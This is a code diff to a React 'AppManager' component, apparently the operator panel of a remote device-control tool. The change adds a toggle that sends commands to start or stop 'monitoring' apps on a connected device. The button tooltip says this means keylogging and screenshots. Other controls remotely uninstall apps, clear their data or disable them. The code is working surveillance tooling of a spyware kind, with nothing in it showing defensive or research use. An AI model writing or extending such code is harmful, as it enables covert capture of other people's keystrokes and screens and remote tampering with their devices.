@@ -21,13 +21,14 @@ export default function AppManager({ device, sendCommand, results }) {
   const deviceId = device.deviceId;
   const isOnline = device.isOnline;
 
-  const [apps, setApps]         = useState([]);
-  const [loading, setLoading]   = useState(false);
-  const [search, setSearch]     = useState('');
+  const [apps, setApps]           = useState([]);
+  const [monitoredApps, setMonitoredApps] = useState([]);
+  const [loading, setLoading]     = useState(false);
+  const [search, setSearch]       = useState('');
   const [showSystem, setShowSystem] = useState(false);
-  const [sortBy, setSortBy]     = useState('name');
+  const [sortBy, setSortBy]       = useState('name');
   const [confirmAction, setConfirmAction] = useState(null);
-  const [uninstallPending, setUninstallPending] = useState(null); // { pkg, countdown }
+  const [uninstallPending, setUninstallPending] = useState(null);
   const uninstallTimerRef = useRef(null);
   const seenIds = useRef(new Set());
 
@@ -36,30 +37,44 @@ export default function AppManager({ device, sendCommand, results }) {
     sendCommand(deviceId, 'get_installed_apps', {});
   };
 
-  // Apps are loaded manually via the Load button
+  const fetchMonitoredApps = useCallback(() => {
+    sendCommand(deviceId, 'list_app_monitor_apps', {});
+  }, [deviceId, sendCommand]);
+
+  // Load monitored apps on mount
+  useEffect(() => {
+    fetchMonitoredApps();
+  }, [fetchMonitoredApps]);
 
   // Parse results
   useEffect(() => {
     results.forEach(r => {
-      if (r.command !== 'get_installed_apps' || seenIds.current.has(r.id)) return;
-
-      const data = typeof r.response === 'string'
-        ? (() => { try { return JSON.parse(r.response); } catch (_) { return null; } })()
-        : r.response;
-
-      // Chunked commands first return a transport acknowledgement.  It is not
-      // the app list and must not consume the result ID before the final chunk
-      // aggregate arrives.
-      if (r.success && data?.streaming && !data.apps && !data.installedApps) return;
-
-      seenIds.current.add(r.id);
-      setLoading(false);
-      if (r.success && data) {
-        const list = data.apps || data.installedApps || [];
-        setApps(Array.isArray(list) ? list : []);
+      if (r.command === 'get_installed_apps') {
+        if (seenIds.current.has(r.id)) return;
+        const data = typeof r.response === 'string'
+          ? (() => { try { return JSON.parse(r.response); } catch (_) { return null; } })()
+          : r.response;
+        if (r.success && data?.streaming && !data.apps && !data.installedApps) return;
+        seenIds.current.add(r.id);
+        setLoading(false);
+        if (r.success && data) {
+          const list = data.apps || data.installedApps || [];
+          setApps(Array.isArray(list) ? list : []);
+        }
+      } else if (r.command === 'list_app_monitor_apps') {
+        if (seenIds.current.has(r.id)) return;
+        if (!r.success || !r.response) return;
+        seenIds.current.add(r.id);
+        try {
+          const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+          const configured = data.configured || [];
+          setMonitoredApps(configured.map(a => a.packageName));
+        } catch (_) {}
       }
     });
   }, [results]);
+
+  const isMonitored = (pkg) => monitoredApps.includes(pkg);
 
   const performAction = (action, pkg) => {
     if (['uninstall_app', 'clear_app_data', 'disable_app'].includes(action)) {
@@ -214,12 +229,19 @@ export default function AppManager({ device, sendCommand, results }) {
                 🚫 Disable
               </button>
               <button
-                className="am-action-btn am-monitor"
-                onClick={() => sendCommand(deviceId, 'add_monitored_app', { packageName: app.packageName })}
+                className={`am-action-btn am-monitor ${isMonitored(app.packageName) ? 'active' : ''}`}
+                onClick={() => {
+                  if (isMonitored(app.packageName)) {
+                    sendCommand(deviceId, 'remove_monitored_app', { packageName: app.packageName });
+                  } else {
+                    sendCommand(deviceId, 'add_monitored_app', { packageName: app.packageName });
+                  }
+                  fetchMonitoredApps();
+                }}
                 disabled={!isOnline}
-                title="Monitor this app (keylog + screenshots)"
+                title={isMonitored(app.packageName) ? 'Stop monitoring this app' : 'Monitor this app (keylog + screenshots)'}
               >
-                📡 Monitor
+                {isMonitored(app.packageName) ? '📡 Monitored' : '📡 Monitor'}
               </button>
               <button
                 className="am-action-btn am-uninstall"
